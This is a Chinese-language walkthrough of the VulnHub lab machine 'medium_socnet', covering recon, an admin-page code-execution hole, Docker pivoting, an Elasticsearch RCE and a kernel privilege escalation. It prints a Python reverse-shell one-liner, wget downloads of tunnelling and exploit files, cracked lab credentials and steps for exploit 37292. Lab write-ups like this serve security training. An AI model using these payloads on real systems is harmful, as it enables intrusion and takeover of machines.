---
layout: article
title: "medium\_socnet"
mathjax: true
tags: "vulnhub"
---

# medium\_socnet
by：飞鸟(FeiNiao)
# 主机发现
受害机与kali为同一网段

使用arp二层主机发现扫描

```
C:\root> arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:16:1d:cc, IPv4: 192.168.0.61
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     dc:fe:18:4c:9c:b5       TP-LINK TECHNOLOGIES CO.,LTD.
192.168.0.71    f0:9e:4a:34:c9:d4       (Unknown)
192.168.0.72    08:00:27:f0:07:0a       PCS Systemtechnik GmbH
192.168.0.50    24:df:a7:b9:0e:76       Hangzhou BroadLink Technology Co.,Ltd
192.168.0.53    c2:8f:08:9e:2f:ec       (Unknown: locally administered)
192.168.0.58    4c:32:75:89:a3:69       Apple, Inc.

9 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.926 seconds (132.92 hosts/sec). 6 responded
```
发现受害机地址为192.168.0.72

# 端口扫描
对受害机的端口进行扫描

```
C:\root> nmap -p- 192.168.0.72
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-11 03:26 EDT
Nmap scan report for 192.168.0.72
Host is up (0.000050s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
MAC Address: 08:00:27:F0:07:0A (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
```
发现只开了22和5000端口

对这两个端口进行详细的探测

```
C:\root> nmap -p22,5000 -sV 192.168.0.72
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-11 03:29 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 03:29 (0:00:06 remaining)
Nmap scan report for 192.168.0.72
Host is up (0.00027s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)
MAC Address: 08:00:27:F0:07:0A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds
```
22是ssh协议，5000是一个web服务器

使用浏览器访问

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/RWt8MQZAYywFIPqxdvGY1Gr6z6cCtDlq-fOfmn1qFZI.png?raw=true)

看样子是python写的，是个留言板差不多的东西

xss，sql都试了看来没啥用

# 目录扫描
扫描一下目录吧

```
C:\root> dirsearch -u http://192.168.0.72:5000/                                1 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.0.72-5000/-_22-08-11_03-38-16.txt

Error Log: /root/.dirsearch/logs/errors-22-08-11_03-38-16.log

Target: http://192.168.0.72:5000/

[03:38:16] Starting:
[03:38:21] 200 -  401B  - /admin

Task Completed
```
看结果只扫描出来一个/admin目录

访问

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/3COJl-xTlAQfEW62p1Ksww_CoJfkVSlH5cE-rGQO5Lc.png?raw=true)

管理页面，可以执行代码，联想前面搜集的信息，可能是python写的后端

那就执行python代码吧

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.61",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
# nc反弹shell
kali进行nc监听1234端口

```
C:\root> nc -lvvp 1234
```
run Test code

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/4XuixmiIAGARau3l9_HGZAKwMq8fkjYRRR8b8xxIJS0.png?raw=true)

反弹成功

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/Is6KSTXe7e8FGEZWibmgapgFy3_34hK1cEpXlPp4SmU.png?raw=true)

快速的看一下这里都有啥，权限为root

有个docker文件，应该运行着docker

看了一眼ip，有内网ip

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/J2IIOK49fozrMjTDTKvbGNuvRaIWmW2jZ_MLfG4mQvk.png?raw=true)

# 内网信息收集
验证是否为docker

```
/app # ls /.dockerenv

/app # cat /proc/1/cgroup
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/zCws9jfU_hGvgeXY26ePkmLi0yr4Cs5u5KsjsygMUrk.png?raw=true)

有这两个文件则100%确定为docker容器

所有我们现在是在docker容器中，想办法突破容器进入宿主机

# 主机发现

先在内网进行主机发现

ping 172.17.0.1-10 靶场原因1-10即可

```
for i in $(seq 1 10);do ping -c 1 172.17.0.$i;done
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/vH_MWeEeXhtomuRCiPGC4hcdZj-n-UiJgRQTeBHHzC8.png?raw=true)

.1 .2 .3都回包了，其他都没回包


# 隧道代理
利用venom进行内网穿透

客户端传入受害机

服务端在kali上运行

在kali上启动服务

```
./admin_linux_x64 -lport 9999
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/I6J0yYwi20PRerJ6oSb9jWsOoQjBAyL1j6mvbIF6CBg.png?raw=true)

受害机要运行客户的程序，需要先将客户端程序传入受害机中

在kali上启动一个http服务

```
python3 -m http.server 80
```
再去受害机上获取kali上的客户端

```
wget http://192.168.0.61/agent_linux_x64
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/h2NmDw8speJ18AzImxxU5gPWbZPPwx5Wt9vlPSHIm8I.png?raw=true)

在受害机上服于客户端执行权限

```
chmod +x agent_linux_x64

执行 ip为kali机 端口是kali的端口
./agent_linux_x64 -rhost 192.168.0.61 -rport 9999
```
在kali机上show一下，就可以看到一个连接

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/Nu39RhsrvtpbZCqpUSLOzqb3oLsfaP52x6MTZqh3U5c.png?raw=true)

连接1 在kali上启动监听socks代理1080

```
goto 1
socks 1080
```
修改proxychains配置文件 socks代理端口1080

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/5k6_hWNv4HzOK1PNYA2BqwwRnEtV4TBvzc9b0ullH1M.png?raw=true)

代理完成，使用proxychains就都走1080代理端口访问内网了

内网的目标有

172.17.0.1

172.17.0.2

172.17.0.3

依次对这三个ip进行nmap扫描

```
s o c k s 4 版 本 协 议 不 ⽀ 持 u d p 和 i c m p 协 议 ， 所 以 使 ⽤ n m a p 要 加 上 - s T  - P n 即 使 ⽤
t c p 协 议 且 不 使 ⽤ i c m p 协 议
```


题外：

```
感觉上面那个代理不好用，cao，nmap一个完后会变得很慢不知道为啥，所以我在msf生成一个elf使用msf进行连接，顺便msf模块真好用，把端口都扫出来了。
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/E7JZ42VJrC3UI1Y8wh6DxSD427RZO0uwKeShqhQEqx4.png?raw=true)



代理nmap扫描各个ip

```
proxychains4 nmap -Pn -sT 172.17.0.1
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/gGkP0sDaf7WzQb2Ak88LvDNm2e7_Vag-eLMmryo1dwc.png?raw=true)

```
proxychains4 nmap -Pn -sT 172.17.0.2
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/Q-blXY16jdD1tGfAUs64GFDpB8y0R8SfLjLACACJ-5U.png?raw=true)



```
proxychains4 nmap -Pn -sT 172.17.0.3
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/SsU2TmzbSX24N1FVvgk4_oEzacLvKGFzhxjwAs_dRZY.png?raw=true)

经过代理nmap扫描，整理如下

```
172.17.0.1         22,5000
172.17.0.2         9200
172.17.0.3         50000
```
在msf上看ifconfig的ip地址是172.17.0.3，不知道.1还是.3是那个192.168.0.72

扫描服务

```
proxychains4 nmap -p22,5000 -Pn -sT -sV 172.17.0.1
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/wUfrNumdiyD8BbtfVSu65u4Rvh_rPVulIkG578vWXFo.png?raw=true)

```
proxychains4 nmap -p9200 -Pn -sT -sV 172.17.0.2
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/79bYGYVN2wZSt5WeXd1cLVfjRQSY_h-0G-2LwkmEpr0.png?raw=true)

```
proxychains4 nmap -p5000 -Pn -sT -sV 172.17.0.3
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/3AMEB6oU7Bv2ZezjZ-CRBbskg-OrLTh6IjfZBWz1TvU.png?raw=true)

通过观察.1和.3的web服务，发现他们是一样的，可能是nginx反代？

设置soscks浏览器代理访问内网web服务

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/364ZpdHfVNUviVqKW35Zd_Cxb5NXzy_ZBT6PEZwBiys.png?raw=true)

简单访问

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/mVsn301i9XdEbg4UzO00z5X_02DYbhk_6kQeZ0MXfrA.png?raw=true)

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/7Fa5-MohJk55azxDPbNGt9417TG242fKag7HW9Sljlo.png?raw=true)

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/k2u_vmDB-FiWqchbRdfZ7E24J-GK_dK8a62P-kXp0_s.png?raw=true)

那就先看.2的 Elasticsearch 

通过介绍这玩意是个非常强大的搜索引擎。看他也是个http服务，我就看了看，没看懂

扫了一下目录，全部报400错误

通过searchsploit工具搜索Elasticsearch的漏洞（ searchsploit是一个用于Exploit-DB的命令行搜索工具）

```
searchsploit Elasticsearch
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/ARpOenoI_afE5i9kd6wdNbncQLDxsrdsWScsWMZa_88.png?raw=true)

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/a1Cd4PwiQcKv1z1nUw3vsO_OjvuqriHZYhRz_xBygis.png?raw=true)

拷贝exp `cp /usr/share/exploitdb/exploits/linux/remote/36337.py .`

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/a1Cd4PwiQcKv1z1nUw3vsO_OjvuqriHZYhRz_xBygis.png?raw=true)

执行exp

`proxychains4 python2 36337.py 172.17.0.2`

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/mRS-BsZKZLL7IVVANsFJQWR0gu4H66kJvMOrAm8IQQg.png?raw=true)

执行成功，权限为root

逛一下，就看到了一个password的文件

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/5iC0_Tvf74ag8h6kxfu08YacW3zZYS7lEEUpyc301bc.png?raw=true)

有一些账户

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/99pNz4AbjS-9pOmsDxi3YIBpcmBWsbAsoP5tJ-ryOO0.png?raw=true)

拿去解密

```
john:3f8184a7343664553fcb5337a3138814 1337hack
test:861f194e9d6118f3d942a72be3e51749 1234test
admin:670c3bbc209a18dde5446e5e6c1f1d5b 1111pass
root:b3d34352fc26117979deabdf1b9b6354 1234pass
jane:5c158b60ed97c723b673529b8a3cf72b 1234jane
```
既然有了账户和密码，那就可以去尝试进行ssh连接

发现好像就.1开放了ssh

.1也就是192.168.0.72

经过测试只有john账户可以登入ssh

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/4xdu54P9xLV46ZbBevHrr6VGiVYKUPWpEkbEMCbKMeo.png?raw=true)

登入进行简单的id查看权限，发现是普通权限
# 权限提升

sudo -s 提权不了

uname -a  发现是3.13古老的版本

搜索一下看看有没有漏洞

```
searchsploit linux 3.13
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/MzldMJGqzF_K37_05w74gcmKyeDB4JmUJPmzVUfgLbs.png?raw=true)

使用这个漏洞进行exp

把源代码文件拷贝到当前目录下

`cp /usr/share/exploitdb/exploits/linux/local/37292.c .`

看exp文件，有利用方式

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/ZA-7hH2UPrAHOZz-akstyBNddWumZdPOv-ZgY8VJACg.png?raw=true)



这个exp文件有bug，将底下点代码删除，保存

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/8HCrBVlGFTZbXoJCGfDvKnj42IxWenzuJQhNGJ6CbFU.png?raw=true)

编译：`gcc -o 37292_exp 37292.c`

查找二进制文件 `locate ofs-lib.so`

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/Hut91iwxBm7QxMakPoHXZ_1rWHPy3CTQN4OYYi4NBrs.png?raw=true)

拷贝出来

`cp /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .`

kali开启web服务

`python3 -m http.server 80` 

ssh\_john主机进行wget获取

`wget http://192.168.0.56/ofs-lib.so` 

`wget http://192.168.0.56/37292_exp`

为了执行顺利，把两个文件移到tmp目录下

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/6gxjSL3DvA0nvgIlVH5OlsRbyQIAhvhIeQjDyvEbxg4.png?raw=true)

`chmod +x *` 加上可执行权限

`./37292_exp` 执行脚本

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/Wqm3F0dHb88LYAjcWJnbhpkZbB8MAWrA9_CoPPdp660.png?raw=true)

获取root权限

![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/eA7qmTFeHVBLWIuL3pwe9andHpRHOI1nzk0jsneBahU.png?raw=true)

完成

```
总结：
首先进行主机发现，扫描了ip地址
扫描到了对其进行端口扫描
22，5000(http)端口开放
对5000端口进行访问，没有什么可利用的点，对其进行目录扫描
扫出来一个admin目录，有代码执行漏洞，利用python反弹shell
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.61",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

进去发现是docker容器
ls /.dockerenv  or  cat /proc/1/cgroup 命令查看

进行内网主机发现
for i in $(seq 1 10);do ping -c 1 172.17.0.$i;done

ping出来了172.17.0.1,2,3主机

进行内网穿透后，代理nmap扫描各个主机

.2有个Elasticsearch 利用远程代码执行漏洞拿下
进入.2的机器有个passwords文件，含有账号密码

ssh连接192.168.0.72

uname -a 发现3.13版本有漏洞
但是利用代码有点问题，进行了删减，最后成功利用
拿下宿主机


最后带着疑问看了一下172.17.0.1的机器，也开着ssh服务，使用proxychains4代理连接，也成功了，也可以提权

还有就是，为啥网上都没扫描到172.17.0.3，我扫描到了
```
![image](https://github.com/FeiNiao/feiniao.github.io/blob/master/_posts/images/vlKmzP1WVuoXF1p9ugjXOwRUwr9E08JfjdGWKQqFL-g.png?raw=true)

```
docker 容器中有/.dockerenv这个文件，宿主机没有
```





